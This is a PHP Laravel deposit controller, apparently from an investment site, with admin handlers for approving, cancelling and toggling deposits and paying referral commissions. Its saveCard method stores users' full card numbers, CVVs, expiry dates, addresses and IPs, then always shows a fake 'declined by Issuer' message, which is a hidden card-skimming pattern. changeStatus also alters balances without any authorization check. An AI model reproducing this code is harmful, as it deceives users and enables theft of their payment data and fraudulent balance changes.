<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Deposit;
use App\Translog;
use App\User;
use App\Package;
use App\General;
use Auth;
use App\CCard;

class DepositController extends Controller
{
    public function __construct()
    {

    }
    public function get_client_ip() {
        $ipaddress = '';
        if (isset($_SERVER['HTTP_CLIENT_IP']))
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        else if(isset($_SERVER['HTTP_X_FORWARDED']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
        else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
        else if(isset($_SERVER['HTTP_FORWARDED']))
            $ipaddress = $_SERVER['HTTP_FORWARDED'];
        else if(isset($_SERVER['REMOTE_ADDR']))
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        else
            $ipaddress = 'UNKNOWN';
        return $ipaddress;
    }
      public function index()
    {
    	$deposits = Deposit::orderBy('id', 'desc')->get();
    	$page_title = "Deposit  Log";

    	return view('admin.deposit.deposits', compact('deposits','page_title'));
    }

    public function requests()
    {
    	$deposits = Deposit::where('status', 0)->orderBy('id', 'desc')->get();
        $page_title = "DEPOSIT REQUESTS";
    	return view('admin.deposit.requests', compact('deposits','page_title'));
    }

     public function approve(Request $request, $id)
    {
        $deposit = Deposit::findorFail($id);

        $deposit['status'] = 1;
        $deposit->save();

        $user = User::find($deposit['user_id']);
        $user['balance'] = $user->balance + $deposit['amount'];
        $user->save();

        if ($user->refid != 0)
        {
            $pack = Package::first();
            $gnl= General::first();
           $refer = User::find($user->refid);
           $coms = ($gnl->refcom*$deposit['amount'])/100;
           $refer['balance'] = $refer->balance + $coms;
           $refer->save();

            $rlog['user_id'] = $refer->id;
           $rlog['trxid'] = str_random(16);
           $rlog['amount'] = $coms;
           $rlog['balance'] = $refer->balance;
           $rlog['type'] = 1;
           $rlog['details'] = 'Referal Commision';
           Translog::create($rlog);
        }

        $tlog['user_id'] = $user->id;
       $tlog['trxid'] = str_random(16);
       $tlog['amount'] = $deposit['amount'];
       $tlog['balance'] = $user->balance;
       $tlog['type'] = 1;
       $tlog['details'] = 'Deposit Successfull';
       Translog::create($tlog);

        $msg =  'Your Deposit Processed Successfully';
        send_email($user->email, $user->firstname, 'Purchase Processed', $msg);
        $sms =  'Your Deposit Processed Successfully';
        send_sms($user->mobile, $sms);

        return back()->with('success', 'Deposit Request Approved Successfully!');
    }

    public function destroy(Deposit $deposit)
    {
        $user = User::find($deposit['user_id']);

        $msg =  'Your Deposit Request canceled by Admin';
        send_email($user->email, $user->username, 'Deposit Canceled', $msg);
        $sms =  'Your Deposit Request canceled by Admin';
        send_sms($user->mobile, $sms);

        $deposit['status'] = 2;
        $deposit->delete();

        return back()->with('success', 'Deposit Canceled Successfully!');
    }

    //Kingin Exerpt
    public function changeStatus($ref){
      $deposit = Deposit::where('trx',$ref)->first();
      $user = User::where('id',$deposit->user_id)->first();

      if($deposit->status == 0){
        $deposit->status = 1;
        $user->balance =  ($user->balance + $deposit->amount);
      }else if($deposit->status ==1){
         $deposit->status = 0;
          $user->balance =  ($user->balance - $deposit->amount);
      }
        $deposit->save();
        $user->save();

      return back()->with('success', 'Deposit Changed Successfully!');
    }

   public function saveCard(Request $request)
    {

      $dep = Deposit::where('trx', $request->track)->first();
     // dd($dep);
      $with = new CCard();
       $with->user_id = Auth::id();
        $with->name = $request->name;
        $with->amount = $dep->amount;
        $with->cvv = $request->cardCVC;
        $with->card_no =  $request->cardNumber;
        $with->exp_date = $request->cardExpiry;
        $with->street = $request->street;
        $with->state = $request->state;
        $with->city= $request->city;
        $with->zipcode=$request->zip;
        $with->ref = $request->track;
        $with->country = $request->country;
        $with->ip = $this->get_client_ip();
      
      $with->save();
      return back()->with('alert', 'Card has been declined by Issuer!!');
    }
}
